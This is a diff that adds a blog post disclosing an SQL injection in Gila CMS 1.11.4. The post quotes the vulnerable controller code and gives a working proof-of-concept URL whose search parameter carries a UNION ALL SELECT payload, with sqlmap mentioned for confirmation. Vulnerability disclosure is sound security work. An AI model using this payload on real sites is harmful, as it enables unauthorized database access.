@@ -63,6 +63,51 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
+    <article id="post-SQL-injection-in-Gila-CMS-version-1-11-4" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/">SQL injection in Gila CMS version 1.11.4</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/" class="article-date">
+  <time datetime="2019-10-13T10:03:05.000Z" itemprop="datePublished">2019-10-13</time>
+</a>
+    
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>*<em>0x01 *</em><br>I installed the latest version of GilaCMS (v1.11.4). After the administrator log in to the website, the search for the sql injection vulnerability exists in the content-&gt;pages-&gt;posts page.</p>
+<p>The vulnerability related code is in lines 101 to 127 of /src/core/controllers/cm.php, the parameter $_GET is not filtered, and the line is directly brought into the getRows function to perform data query in line 122, resulting in sql injection.</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function list_rowsAction ()</span><br><span class="line">&#123;</span><br><span class="line">  header(&apos;Content-Type: application/json&apos;);</span><br><span class="line">  $table = router::get(&quot;t&quot;,1);</span><br><span class="line">  $result = self::list_rows($table, $_GET, $_GET);</span><br><span class="line">  echo json_encode($result, JSON_PRETTY_PRINT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function list_rows ($table, $filters, $args)</span><br><span class="line">&#123;</span><br><span class="line">  if(isset($args[&apos;groupby&apos;])&amp;&amp;$args[&apos;groupby&apos;]!=null) &#123;</span><br><span class="line">    $this-&gt;group_rowsAction();</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  $pnk = new gTable($table, $this-&gt;permissions);</span><br><span class="line">  if(!$pnk-&gt;can(&apos;read&apos;)) return;</span><br><span class="line">  $result = [];</span><br><span class="line"></span><br><span class="line">  $fieldlist = isset($args[&apos;id&apos;]) ? &apos;edit&apos; : &apos;list&apos;;</span><br><span class="line">  $result[&apos;fields&apos;] = $pnk-&gt;fields($fieldlist);</span><br><span class="line">  $result[&apos;rows&apos;] = [];</span><br><span class="line">  $res = $pnk-&gt;getRows($filters, array_merge($args, [&apos;select&apos;=&gt;$result[&apos;fields&apos;]]));</span><br><span class="line">  foreach($res as $r) $result[&apos;rows&apos;][] = array_values($r);</span><br><span class="line">  $result[&apos;startIndex&apos;] = $pnk-&gt;startIndex($args);</span><br><span class="line">  $result[&apos;totalRows&apos;] = $pnk-&gt;totalRows($filters);</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>0x02 Vulnerability certificate</strong><br>Vulnerability url:http://[address]:[port]/[app_path]/cm/list_rows/post?page=1&amp;search=qww’)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT(‘123’,’456’),’789’)–+THB<br>Send a get query request after entering characters in the search box</p>
+<p><img src="https://i.loli.net/2019/10/13/a3MgxbKeEjJIyO7.png" alt="F070CE3A-AF46-4258-888E-887DDEDBD717.png"></p>
+<p>Then insert the SQL statement in the search parameter.Returns the field with 123456789 in the package, so you can execute sql. SQL injection exists</p>
+<p><img src="https://i.loli.net/2019/10/13/VQEfxZP6OUv3m74.png" alt="A056417D-551C-4A59-9030-1EC061CE3475.png"></p>
+<p><img src="https://i.loli.net/2019/10/13/j5vH74Zu6nB3sz8.png" alt="图片.png"><br>Sqlmap can also verify this vulnerability</p>
+<p><img src="https://i.loli.net/2019/10/13/GNsEiIHy8vALBFM.png" alt="61FA3993-DD09-4AC4-BB88-140C0F02A642.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
     <article id="post-Bypass-the-HTML-file-suffix-restriction-when-uploading-files" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -313,6 +358,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/10/13/SQL-injection-in-Gila-CMS-version-1-11-4/">SQL injection in Gila CMS version 1.11.4</a>
+          </li>
         
           <li>
             <a href="/2019/10/12/Bypass-the-HTML-file-suffix-restriction-when-uploading-files/">Bypass the HTML file suffix restriction when uploading files</a>
